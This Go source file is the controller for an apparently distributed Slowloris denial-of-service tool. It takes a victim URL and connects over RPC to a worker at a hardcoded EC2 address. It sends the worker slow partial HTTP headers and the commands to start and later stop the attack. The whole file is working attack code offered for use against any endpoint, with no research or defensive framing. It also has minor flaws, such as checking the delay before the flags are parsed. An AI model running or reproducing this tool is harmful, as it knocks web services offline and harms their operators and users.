package main

import (
  "flag"
  "net/rpc"
  "Distributed-Slow-Loris/shared"
  "fmt"
  "os"
  "os/signal"
)

const (
  EC2 = "18.219.140.44:" // EC2 public connection IP (TODO provision more instances)
  port = "3000" // port that worker(s) listen on
  SETSTATE = "Worker.SetState"
  SETHEADERS = "Worker.SetHeaders"
  ATTACK = "Worker.Attack"
  TERM = "Worker.Terminate"
)

/*
type WorkerInfo struct {
        conn      *rpc.Client
        addr      workerAddress
}*/

type BroadCaster struct {
        clients   []*rpc.Client
        workers   []string
}

func main() {
  endpoint := flag.String("endpoint", "", "endpoint which will be victim of slowloris attack")
  delay := flag.Int("delay", 10, "time to wait between writes to specified endpoint")
  // set delay to be at least 5 seconds
  if *delay < 5 {
    *delay = 5
  }
  numAttackers := flag.Int("threads", 10, "number of threads to be dispatched to execute attacks")
  timeout := flag.Int("timeout", 0, "optional timeout (if you want attack to eventually terminate)")
  flag.Parse()

  // exit if no endpoint provided
  if *endpoint == "" {
    fmt.Println("usage: broadcaster -endpoint <url> ...")
    return
  }

  broadcaster := &BroadCaster{clients: make([]*rpc.Client, 0), workers: make([]string, 0)}

  // add single EC2 to list of workers, planning for  eventually managing multiple workers
  broadcaster.workers = append(broadcaster.workers, EC2)

  // establish RPC clients for each worker
  for _, address := range broadcaster.workers {
    conn, err := rpc.Dial("tcp", address + port)
    if err != nil {
      fmt.Println("failed to connect to worker at  address:", address)
      continue
    }
    // add RPC client for host to list of clients
    fmt.Println("RPC client created for address:", address)
    broadcaster.clients = append(broadcaster.clients, conn)
  }

  // store important state to be sent to worker
  workerState := &shared.State {
    Endpoint:     *endpoint,
    Delay:        *delay,
    NumAttackers: *numAttackers,
    Timeout:      *timeout,
  }

  // set headers used for slow loris attack
  workerHeaders := &shared.Headers{
    Base: []byte("GET / HTTP/1.0\r\n"),
    //General: []byte("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0 Accept-language: en-US,en,q=0.5"),
    Loris: []byte("X-a 1\r\n"),
  }

  // attack request and response paramters, only needed to
  // satisfy RPC convention
  attackReq := 0
  attackRes := 0

  // store status codes for setting worker state (only necessary to uphold RPC convention)
  var setStateRes, setHeadersRes int

  fmt.Println(workerState, workerHeaders, setStateRes, setHeadersRes)

  // use RPC to set important headers/state for all workers, and execute attacks
  for _, conn := range broadcaster.clients {
    go func() {
      if err := conn.Call(SETHEADERS, workerHeaders, &setHeadersRes); err != nil {
        fmt.Println("Error setting headers for worker")
      } else {
        fmt.Println("SET HEADERS")
      }
      if err := conn.Call(SETSTATE, workerState, &setStateRes); err != nil {
        fmt.Println("Error setting headers for worker")
      } else {
        fmt.Println("SET STATE")
      }
      if err := conn.Call(ATTACK, attackReq, &attackRes); err != nil {
        fmt.Println("Error executing attack")
      } else {
        fmt.Println("EXECUTING ATTACK")
      }
    }()
  }


  interruptChan := make(chan os.Signal, 1)
  doneChan := make(chan int)
  // send SIGINT to interruptChan
  signal.Notify(interruptChan, os.Interrupt)
  // blocking goroutine, waits on OS interrupt to
  // execute termination RPC, main is blocked on response
  go func() {
    <-interruptChan
    fmt.Println("Goodbye")
    for _, conn := range broadcaster.clients {
      req := 0
      res := 0
      // terminate slow loris attacks
      for {
        if err := conn.Call(TERM, req, &res); err == nil {
          fmt.Println("terminating connection")
          break
        }
        fmt.Println("error terminating connection, trying again")
      }
    }
    // unblock main after terminating slow loris attacks
    doneChan<-1
  }()
  <-doneChan
}
